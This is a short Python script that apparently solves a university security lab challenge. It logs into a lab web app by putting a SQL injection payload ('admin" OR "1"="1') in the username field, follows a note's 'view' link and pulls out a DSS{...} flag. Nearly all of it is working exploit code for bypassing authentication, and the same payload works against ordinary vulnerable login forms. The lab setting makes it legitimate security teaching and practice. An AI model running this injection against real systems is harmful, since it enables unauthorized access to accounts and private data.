import requests
import re
import os

# Please set your token in the terminal using `export DSS_AUTH_TOKEN=<YOUR-TOKEN>`.
#   DO NOT HARDCODE your token!
TOKEN = os.environ.get("DSS_AUTH_TOKEN")
headers = {
    "DSS-AUTH-TOKEN": TOKEN
}
LOGIN_URL = "https://0xb0.labs.dss.edu.distrinet-research.be/login"
NOTES_URL = "https://0xb0.labs.dss.edu.distrinet-research.be/notes"
BASE_URL = "https://0xb0.labs.dss.edu.distrinet-research.be"

# requests.Sesstion() makes sure cookies that are being set are automagically stored
#   and attached to the subsequent requests where necessary.
# You might need to url-encode the data/url depending on the request
#  Use cyberchef to do this: https://gchq.github.io/CyberChef/
with requests.Session() as s:
    login_response = s.post(LOGIN_URL, headers=headers, data={"username":'admin" OR "1"="1',"password":'x'})
    notes_response = s.get(NOTES_URL, headers=headers)
    find_href_view = re.search(r'<a[^>]*href\s*=\s*["\']?\s*([^"\'\s>]+)\s*["\']?[^>]*>\s*view\s*</a>', notes_response.text, re.IGNORECASE)
    if find_href_view:
        note_url = find_href_view.group(1)
    else:
        print("no href")
        exit()
    admin_response = s.get(BASE_URL+note_url, headers=headers)


    if admin_response.status_code == 200 and login_response.status_code == 200:
        # You can use re.search to find the flag format in the response
        flag_match = re.search(r"DSS{.*}", admin_response.text)

        if flag_match:
            print(flag_match.group(0))
        else:
            print("flag not found")
            
    else:
        print(admin_response.status_code)
    
